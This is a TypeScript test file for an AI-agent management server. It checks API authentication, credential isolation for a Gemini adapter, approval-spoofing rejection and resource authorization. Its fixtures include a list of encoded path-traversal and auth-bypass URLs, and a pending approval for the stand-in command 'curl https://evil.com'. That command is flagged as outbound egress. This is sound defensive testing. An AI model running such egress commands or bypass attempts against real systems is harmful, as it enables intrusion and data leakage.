import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { createApp } from "./app.js";
import { loadConfig } from "./config.js";
import { IdentityService } from "./identity.js";
import { JsonStore } from "./store.js";
import type { AgentService } from "./agent-service.js";
import type { ApprovalActor } from "./types.js";

const service = {
  listAgents: () => [],
  systemInfo: async () => ({}),
} as unknown as AgentService;

const temporaryDirectories: string[] = [];
afterEach(async () => {
  vi.unstubAllGlobals();
  await Promise.all(temporaryDirectories.splice(0).map((d) => rm(d, { recursive: true, force: true })));
});

async function makeIdentity(): Promise<IdentityService> {
  const root = await mkdtemp(path.join(tmpdir(), "launchpad-app-approval-"));
  temporaryDirectories.push(root);
  const store = new JsonStore(path.join(root, "db.json"));
  await store.initialize();
  await store.mutate((database) => {
    database.principals.push({
      id: "agent-1", kind: "agent", name: "Agent 1", createdAt: new Date().toISOString(),
    });
  });
  return new IdentityService(store);
}

async function selectMockPrincipal(
  app: Awaited<ReturnType<typeof createApp>>,
  principalId: string,
): Promise<string> {
  const response = await app.inject({
    method: "POST",
    url: "/api/mock-principal-session",
    payload: { principalId },
  });
  expect(response.statusCode).toBe(201);
  return response.json().sessionToken as string;
}

describe("HTTP boundary", () => {
  it("protects API routes with the configured shared token", async () => {
    const app = await createApp(
      loadConfig({ NODE_ENV: "test", APP_AUTH_TOKEN: "a-strong-test-token" }),
      service,
    );
    const denied = await app.inject({ method: "GET", url: "/api/agents" });
    expect(denied.statusCode).toBe(401);

    const allowed = await app.inject({
      method: "GET",
      url: "/api/agents",
      headers: { authorization: "Bearer a-strong-test-token" },
    });
    expect(allowed.statusCode).toBe(200);

    const nonCanonicalCases: Array<[string, number]> = [
      ["/api//agents", 401],
      ["/api/./agents", 401],
      ["/api/%2e/agents", 401],
      ["/api/%2e%2e/api/agents", 401],
      ["//api/agents", 401],
      ["/api\\agents", 401],
      ["/api%5cagents", 401],
      ["/api/%5cagents", 401],
      ["/api%2fagents", 401],
      ["/api/%2fagents", 401],
      ["/api/%252e/agents", 401],
      ["/api/%ZZ/agents", 400],
    ];
    for (const [url, statusCode] of nonCanonicalCases) {
      const response = await app.inject({ method: "GET", url });
      expect(response.statusCode, url).toBe(statusCode);
      expect(response.body, url).not.toContain("secret");
      if (statusCode === 401) {
        expect(response.json(), url).toEqual({ error: "Authentication required" });
      }
    }
    await app.close();
  });

  it("serves production static assets without exposing protected API routes", async () => {
    const app = await createApp(
      loadConfig({
        NODE_ENV: "production",
        HOST: "127.0.0.1",
        APP_AUTH_TOKEN: "a-strong-test-token",
      }),
      service,
    );

    const page = await app.inject({ method: "GET", url: "/" });
    expect(page.statusCode).toBe(200);
    expect(page.headers["content-type"]).toContain("text/html");
    expect(page.body).toContain("Agent Launchpad");

    const protectedApi = await app.inject({ method: "GET", url: "/api//agents" });
    expect(protectedApi.statusCode).toBe(401);
    await app.close();
  });

  it("rejects missing and unrelated credentials before calling Gemini", async () => {
    const fetchMock = vi.fn();
    vi.stubGlobal("fetch", fetchMock);
    const app = await createApp(
      loadConfig({
        NODE_ENV: "test",
        APP_AUTH_TOKEN: "browser-token",
        GEMINI_API_KEY: "google-provider-key",
        GEMINI_ADAPTER_TOKEN: "runtime-only-token-1234567890",
      }),
      service,
    );

    for (const authorization of [
      undefined,
      "Bearer browser-token",
      "Bearer google-provider-key",
      "bearer runtime-only-token-1234567890",
      "Basic runtime-only-token-1234567890",
      "Bearer  runtime-only-token-1234567890",
      "Bearer runtime-only-token-1234567890 ",
    ]) {
      const response = await app.inject({
        method: "POST",
        url: "/api/adapter/responses",
        headers: authorization ? { authorization } : {},
        payload: { input: [] },
      });
      expect(response.statusCode).toBe(401);
    }
    expect(fetchMock).not.toHaveBeenCalled();
    await app.close();
  });

  it.each(["openrouter", "ark"] as const)(
    "disables the Gemini adapter for selected %s configurations",
    async (modelProvider) => {
    const fetchMock = vi.fn();
    vi.stubGlobal("fetch", fetchMock);
    const app = await createApp(
      loadConfig({
        NODE_ENV: "test",
        MODEL_PROVIDER: modelProvider,
        OPENROUTER_API_KEY: "openrouter-provider-key",
        OPENROUTER_MODEL: "openai/test",
        ARK_API_KEY: "ark-provider-key",
        ARK_MODEL: "ark-test",
      }),
      service,
    );

    const response = await app.inject({
      method: "POST",
      url: "/api/adapter/responses",
      headers: { authorization: "Bearer openrouter-provider-key" },
      payload: { input: [] },
    });
    expect(response.statusCode).toBe(404);
    expect(fetchMock).not.toHaveBeenCalled();
    await app.close();
  });

  it("allows the dedicated Runtime credential and only forwards the Gemini key", async () => {
    const fetchMock = vi.fn().mockResolvedValue(
      new Response(
        JSON.stringify({
          choices: [{ message: { content: "adapter reached" } }],
          usage: { prompt_tokens: 2, completion_tokens: 1, total_tokens: 3 },
        }),
        { status: 200, headers: { "content-type": "application/json" } },
      ),
    );
    vi.stubGlobal("fetch", fetchMock);
    const app = await createApp(
      loadConfig({
        NODE_ENV: "test",
        APP_AUTH_TOKEN: "browser-token",
        MODEL_PROVIDER: "gemini",
        GEMINI_API_KEY: "google-provider-key",
        GEMINI_ADAPTER_TOKEN: "runtime-only-token-1234567890",
        OPENROUTER_API_KEY: "openrouter-provider-key",
        ARK_API_KEY: "ark-provider-key",
      }),
      service,
    );

    const response = await app.inject({
      method: "POST",
      url: "/api/adapter/responses",
      headers: { authorization: "Bearer runtime-only-token-1234567890" },
      payload: { model: "gemini-test", input: [] },
    });
    expect(response.statusCode).toBe(200);
    expect(response.body).toContain("response.completed");
    expect(fetchMock).toHaveBeenCalledOnce();
    expect(fetchMock).toHaveBeenCalledWith(
      "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions",
      expect.objectContaining({
        headers: expect.objectContaining({ Authorization: "Bearer google-provider-key" }),
      }),
    );
    expect(JSON.stringify(fetchMock.mock.calls)).not.toContain("openrouter-provider-key");
    expect(JSON.stringify(fetchMock.mock.calls)).not.toContain("ark-provider-key");
    await app.close();
  });

  it("preserves Fastify client error status codes", async () => {
    const app = await createApp(loadConfig({ NODE_ENV: "test" }), service);
    const malformed = await app.inject({
      method: "POST",
      url: "/api/agents",
      headers: { "content-type": "application/json" },
      payload: "{not-json",
    });
    expect(malformed.statusCode).toBe(400);

    const oversized = await app.inject({
      method: "POST",
      url: "/api/agents",
      headers: { "content-type": "application/json" },
      payload: JSON.stringify({ name: "x".repeat(1_100_000) }),
    });
    expect(oversized.statusCode).toBe(413);
    await app.close();
  });

  it("exposes run trace events", async () => {
    const runId = "11111111-1111-4111-8111-111111111111";
    const agentId = "22222222-2222-4222-8222-222222222222";
    const service = {
      listAgents: () => [],
      systemInfo: async () => ({}),
      getRunEvents: () => [
        {
          id: "event-1",
          runId,
          agentId,
          type: "run.created",
          severity: "info",
          title: "Run queued",
          detail: "Queued prompt preview: hello",
          createdAt: new Date().toISOString(),
        },
      ],
    } as unknown as AgentService;
    const app = await createApp(loadConfig({ NODE_ENV: "test" }), service);
    const response = await app.inject({ method: "GET", url: "/api/runs/" + runId + "/events" });
    expect(response.statusCode).toBe(200);
    expect(response.json()).toMatchObject({ events: [{ type: "run.created" }] });
    await app.close();
  });

  it("exposes and resolves approval requests via HTTP", async () => {
    const approvalId = "33333333-3333-4333-8333-333333333333";
    const identity = await makeIdentity();
    const resolveApproval = vi.fn(
      async (_id: string, decision: "approved" | "denied", _actor: ApprovalActor) => ({
        id: approvalId,
        status: decision,
      }),
    );
    const service = {
      listAgents: () => [],
      systemInfo: async () => ({}),
      listApprovals: () => [
        {
          id: approvalId,
          runId: "run-1",
          agentId: "agent-1",
          actionType: "command",
          actionDetail: "curl https://evil.com",
          ruleId: "SEC-EGRESS-003",
          reason: "Outbound network egress",
          riskLevel: "high",
          status: "pending",
          createdAt: new Date().toISOString(),
          resolvedAt: null,
          resolvedByPrincipalId: null,
          resolvedByDisplayName: null,
        },
      ],
      resolveApproval,
    } as unknown as AgentService;

    const app = await createApp(loadConfig({ NODE_ENV: "test" }), service, identity);
    const listRes = await app.inject({ method: "GET", url: "/api/approvals" });
    expect(listRes.statusCode).toBe(200);
    expect(listRes.json()).toMatchObject({ approvals: [{ id: approvalId, status: "pending" }] });

    const sessionToken = await selectMockPrincipal(app, "user-b");
    const approveRes = await app.inject({
      method: "POST",
      url: `/api/approvals/${approvalId}/approve`,
      headers: {
        "x-mock-principal-session": sessionToken,
        "x-principal-id": "user-a",
      },
    });
    expect(approveRes.statusCode).toBe(200);
    expect(approveRes.json()).toMatchObject({ approval: { id: approvalId, status: "approved" } });
    expect(resolveApproval).toHaveBeenCalledWith(
      approvalId,
      "approved",
      { principalId: "user-b", displayName: "User B" },
    );

    await app.close();
  });

  it.each(["operatorName", "resolvedBy"])("rejects %s approval body spoofing", async (field) => {
    const approvalId = "33333333-3333-4333-8333-333333333333";
    const resolveApproval = vi.fn();
    const service = {
      listAgents: () => [],
      systemInfo: async () => ({}),
      resolveApproval,
    } as unknown as AgentService;
    const app = await createApp(loadConfig({ NODE_ENV: "test" }), service, await makeIdentity());

    const sessionToken = await selectMockPrincipal(app, "user-b");
    const response = await app.inject({
      method: "POST",
      url: `/api/approvals/${approvalId}/approve`,
      headers: { "x-mock-principal-session": sessionToken },
      payload: { [field]: "User B" },
    });
    expect(response.statusCode).toBe(400);
    expect(resolveApproval).not.toHaveBeenCalled();

    await app.close();
  });

  it.each([
    ["missing session", undefined],
    ["unknown session", "not-a-server-issued-session"],
  ])("rejects approval for %s", async (_case, sessionToken) => {
    const approvalId = "33333333-3333-4333-8333-333333333333";
    const resolveApproval = vi.fn();
    const service = {
      listAgents: () => [],
      systemInfo: async () => ({}),
      resolveApproval,
    } as unknown as AgentService;
    const app = await createApp(loadConfig({ NODE_ENV: "test" }), service, await makeIdentity());

    const response = await app.inject({
      method: "POST",
      url: `/api/approvals/${approvalId}/approve`,
      ...(sessionToken ? { headers: { "x-mock-principal-session": sessionToken } } : {}),
    });
    expect(response.statusCode).toBe(401);
    expect(resolveApproval).not.toHaveBeenCalled();

    await app.close();
  });

  it("does not issue mock human sessions for Agent principals", async () => {
    const resolveApproval = vi.fn();
    const service = {
      listAgents: () => [],
      systemInfo: async () => ({}),
      resolveApproval,
    } as unknown as AgentService;
    const app = await createApp(loadConfig({ NODE_ENV: "test" }), service, await makeIdentity());

    const response = await app.inject({
      method: "POST",
      url: "/api/mock-principal-session",
      payload: { principalId: "agent-1" },
    });
    expect(response.statusCode).toBe(403);
    expect(resolveApproval).not.toHaveBeenCalled();

    await app.close();
  });

  it("requires and records a mock human session when revoking grants", async () => {
    const identity = await makeIdentity();
    const grant = await identity.createGrant({
      principalId: "agent-1",
      grantedBy: "user-a",
      scope: "resource:read",
      target: "res-a",
    });
    const app = await createApp(
      loadConfig({ NODE_ENV: "test" }),
      service,
      identity,
    );

    const missing = await app.inject({
      method: "POST",
      url: `/api/grants/${grant.id}/revoke`,
    });
    expect(missing.statusCode).toBe(401);
    expect(identity.listGrants("agent-1")[0]?.revokedAt).toBeNull();

    const sessionToken = await selectMockPrincipal(app, "user-b");
    const revoked = await app.inject({
      method: "POST",
      url: `/api/grants/${grant.id}/revoke`,
      headers: { "x-mock-principal-session": sessionToken },
    });
    expect(revoked.statusCode).toBe(200);
    expect(revoked.json().grant.revokedBy).toBe("user-b");

    await app.close();
  });

  it("denies an agent access to another user's resource server-side", async () => {
    const root = await mkdtemp(path.join(tmpdir(), "launchpad-app-authz-"));
    temporaryDirectories.push(root);
    const store = new JsonStore(path.join(root, "db.json"));
    await store.initialize();
    await store.mutate((database) => {
      database.principals.push({
        id: "agent-1", kind: "agent", name: "A1", createdAt: new Date().toISOString(),
      });
    });
    const identity = new IdentityService(store);
    const app = await createApp(
      loadConfig({ NODE_ENV: "test" }),
      {} as unknown as AgentService,
      identity,
    );

    const denied = await app.inject({
      method: "GET",
      url: "/api/resources/res-b",
      headers: { "x-agent-principal-id": "agent-1" },
    });
    expect(denied.statusCode).toBe(403);
    expect(denied.json().decision.ruleId).toBe("AUTHZ-OWNER-010");
    await app.close();
  });
});
